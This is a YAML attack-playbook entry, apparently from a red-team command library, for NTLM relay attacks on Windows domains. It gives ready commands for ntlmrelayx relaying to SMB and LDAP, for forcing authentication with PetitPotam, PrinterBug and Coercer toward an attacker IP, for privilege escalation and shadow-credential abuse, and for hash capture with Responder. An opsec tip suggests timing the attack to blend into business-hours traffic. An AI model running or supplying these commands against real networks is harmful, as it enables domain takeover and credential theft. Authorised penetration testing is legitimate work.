name: NTLMRelay
description: NTLM relay attacks against targets with SMB signing disabled
commands:
- '# NTLM Relay Attack (requires SMB signing disabled on target)'
- ''
- '# Step 1: Start relay server targeting vulnerable host'
- ntlmrelayx.py -t smb://<TARGET_HOST> -smb2support
- ''
- '# Step 2: Coerce authentication from high-value target'
- '# Using PetitPotam (MS-EFSR)'
- python3 PetitPotam.py <ATTACKER_IP> <SOURCE_HOST>
- ''
- '# Using PrinterBug (MS-RPRN)'
- python3 printerbug.py <DOMAIN>/<USER>:<PASSWORD>@<SOURCE_HOST> <ATTACKER_IP>
- ''
- '# Using Coercer (multiple protocols)'
- python3 Coercer.py -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -l <ATTACKER_IP> -t <SOURCE_HOST>
- ''
- '# Relay to LDAP for ACL abuse (if LDAP signing not required)'
- ntlmrelayx.py -t ldap://<DC_IP> --escalate-user <USER>
- ''
- '# Relay to LDAP for Shadow Credentials'
- ntlmrelayx.py -t ldap://<DC_IP> --shadow-credentials --shadow-target '<TARGET_USER>'
- ''
- '# Responder for capturing NetNTLM hashes'
- responder -I eth0 -dwP
opsec:
- Relay attacks create network traffic
- Failed authentication attempts logged
- Consider timing attacks during business hours
references:
- https://github.com/lgandx/Responder
- https://github.com/fortra/impacket
- https://github.com/topotam/PetitPotam
- https://github.com/p0dalirius/Coercer
